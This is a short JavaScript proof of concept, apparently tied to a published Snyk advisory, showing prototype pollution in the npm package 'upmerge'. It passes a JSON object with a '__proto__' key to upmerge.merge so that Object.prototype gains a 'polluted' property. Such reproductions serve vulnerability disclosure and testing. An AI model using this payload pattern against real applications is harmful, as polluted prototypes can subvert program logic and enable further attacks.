//https://snyk.io/vuln/SNYK-JS-UPMERGE-174133
//let upmerge = require("upmerge"); // this is a minified version
let upmerge = require("upmerge/src/upmerge"); 
upmerge.merge({}, JSON.parse('{"__proto__":{ "polluted" : ["yes"] } }'));
